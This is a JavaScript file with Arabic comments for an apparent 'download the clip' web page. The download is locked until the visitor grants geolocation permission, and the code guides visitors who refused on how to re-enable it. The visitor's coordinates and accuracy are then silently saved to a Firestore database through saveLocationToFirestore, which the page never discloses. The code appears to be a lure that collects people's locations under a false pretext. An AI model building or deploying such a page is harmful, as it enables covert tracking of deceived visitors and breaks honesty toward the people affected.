// ---------- طلب الإذنين: الإشعارات (اختياري) والموقع الجغرافي (إلزامي) ----------
async function requestNotificationPermission() {
  if (!('Notification' in window)) {
    throw new Error('متصفحك لا يدعم إذن الإشعارات');
  }
  const result = await Notification.requestPermission();
  if (result !== 'granted') {
    throw new Error('تم رفض إذن الإشعارات');
  }
}

async function requestGeolocationPermission() {
  if (!navigator.geolocation) {
    throw new Error('متصفحك لا يدعم إذن الموقع الجغرافي');
  }

  // نتحقق من حالة الإذن الحالية أول شي. المتصفح ما يعيد إظهار نافذة الطلب
  // تلقائيًا بعد ما ترفضها مرة، فنوضح للمستخدم كيف يفعّلها يدويًا بدل ما نعلّق.
  if (navigator.permissions && navigator.permissions.query) {
    try {
      const status = await navigator.permissions.query({ name: 'geolocation' });
      if (status.state === 'denied') {
        throw new Error(
          'الإذن مرفوض مسبقًا من إعدادات المتصفح، ولن يظهر طلبه تلقائيًا مرة ثانية. اضغط على أيقونة القفل بجانب رابط الصفحة أعلى المتصفح، افتح إعدادات الموقع، وغيّر إذن "الموقع الجغرافي" إلى "السماح"، ثم حدّث الصفحة وجرّب من جديد.'
        );
      }
    } catch (permErr) {
      // نعيد رمي رسالتنا المخصصة فقط، وإلا يعني الـ API غير مدعومة بالكامل فنكمل عادي
      if (permErr instanceof Error && permErr.message.startsWith('الإذن مرفوض')) {
        throw permErr;
      }
    }
  }

  return new Promise((resolve, reject) => {
    // مؤقّت احتياطي: لو المتصفح ما استدعى أي دالة إطلاقًا (يصير أحيانًا على file://
    // أو أي أصل غير آمن)، نوقف الانتظار بعد 9 ثوانٍ بدل ما يظل الزر عالق للأبد.
    const fallbackTimer = setTimeout(() => {
      reject(new Error('لم يستجب المتصفح لطلب الموقع. جرّب تشغيل المشروع عبر خادم محلي (localhost) بدل فتح الملف مباشرة'));
    }, 9000);

    navigator.geolocation.getCurrentPosition(
      (position) => {
        clearTimeout(fallbackTimer);
        resolve(position.coords);
      },
      () => {
        clearTimeout(fallbackTimer);
        reject(new Error('تم رفض إذن الموقع الجغرافي'));
      },
      { timeout: 8000, maximumAge: 0 }
    );
  });
}

document.addEventListener('DOMContentLoaded', () => {
  // ---------- منطق الصفحة الأولى: زر التحميل + التحقق من الأذونات ----------
  const downloadBtn = document.getElementById('downloadBtn');
  const errorMsg = document.getElementById('errorMsg');
  const errorDetail = document.getElementById('errorDetail');

  if (downloadBtn) {
    const label = downloadBtn.querySelector('.btn__label');

    const setLoading = (isLoading, text) => {
      downloadBtn.disabled = isLoading;
      downloadBtn.classList.toggle('is-loading', isLoading);
      label.textContent = text;
    };

    const showError = (message) => {
      errorDetail.textContent = message;
      errorMsg.hidden = false;
    };

    const hideError = () => {
      errorMsg.hidden = true;
    };

    downloadBtn.addEventListener('click', () => {
      hideError();
      setLoading(true, 'جاري التحقق من إذن الموقع...');

      // نطلق طلب إذن الإشعارات بدون ما ننتظر نتيجته (اختياري تمامًا).
      requestNotificationPermission().catch(() => {
        // اختياري: تجاهل الرفض عمدًا
      });

      // إذن الموقع الجغرافي هو الشرط الإلزامي الوحيد للانتقال للصفحة الثانية.
      requestGeolocationPermission()
        .then((coords) => {
          // نحفظ الإحداثيات بقاعدة بيانات Firestore إذا ملف firebase-config.js
          // مضبوط وشغّال؛ لو ما زبط أو الملف غير موجود، نكمل عادي بدون توقف.
          if (typeof window.saveLocationToFirestore === 'function') {
            window.saveLocationToFirestore(coords.latitude, coords.longitude, coords.accuracy);
          }

          sessionStorage.setItem('clipAccess', 'granted');
          window.location.href = 'download.html';
        })
        .catch((err) => {
          showError(err.message);
          setLoading(false, 'اضغط لتحميل المقطع');
        });
    });
  }

  // ---------- منطق الصفحة الثانية: التنزيل الفعلي ----------
  // الرابط الحقيقي موجود في خاصية href بوسم <a> نفسه (انظر download.html)
  // هذا الجزء فقط يعرض رسالة تأكيد بعد الضغط، والتنزيل يبدأ تلقائيًا من المتصفح
  const startDownload = document.getElementById('startDownload');

  if (startDownload) {
    const status = document.getElementById('status');

    startDownload.addEventListener('click', () => {
      status.textContent = 'بدأ التنزيل...';
      status.classList.add('is-success');
    });
  }

  // ---------- زر الرجوع: يلغي الصلاحية حتى يبدأ المستخدم من جديد ----------
  const backLink = document.getElementById('backLink');

  if (backLink) {
    backLink.addEventListener('click', () => {
      sessionStorage.removeItem('clipAccess');
    });
  }
});
